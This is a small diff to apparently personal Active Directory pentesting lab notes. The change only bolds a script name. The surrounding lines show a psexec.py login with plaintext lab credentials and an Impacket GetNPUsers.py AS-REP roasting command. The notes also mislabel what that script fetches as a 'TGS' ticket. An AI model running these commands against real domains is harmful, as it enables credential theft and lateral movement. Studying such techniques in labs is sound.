@@ -1378,7 +1378,7 @@ psexec.py FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@ACADEMY-EA-DC03.FREIGHTLOGI
 
 
 ## Do not require Kerberos preauthentication 
-I a object in AD have this flag means we can utilize the [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) script to ask **TGS** ticket for users that have **Do not require Kerberos preauthentication** set.
+I a object in AD have this flag means we can utilize the [**GetNPUsers**.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) script to ask **TGS** ticket for users that have **Do not require Kerberos preauthentication** set.
 
 ```bash
 GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.129.211.144 -no-pass -format hashcat
